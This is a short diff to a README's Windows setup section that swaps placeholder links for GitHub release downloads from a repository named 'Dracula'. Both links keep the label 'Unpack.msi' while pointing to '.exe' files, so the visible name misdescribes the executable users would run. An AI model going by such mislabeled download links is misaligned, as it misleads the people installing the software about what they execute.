@@ -41,6 +41,6 @@ Coming features:
 
 ## Setup
 ### Windows
-x86 : **[Unpack.msi]('https://download.com')**</br>
-x64 : **[Unpack.msi]('https://download.com')**
+x86 : **[Unpack.msi](https://github.com/Krypt0n36/Dracula/releases/download/1.0/package.exe)**</br>
+x64 : **[Unpack.msi](https://github.com/Krypt0n36/Dracula/releases/download/1.0/package_x64.exe)**
 
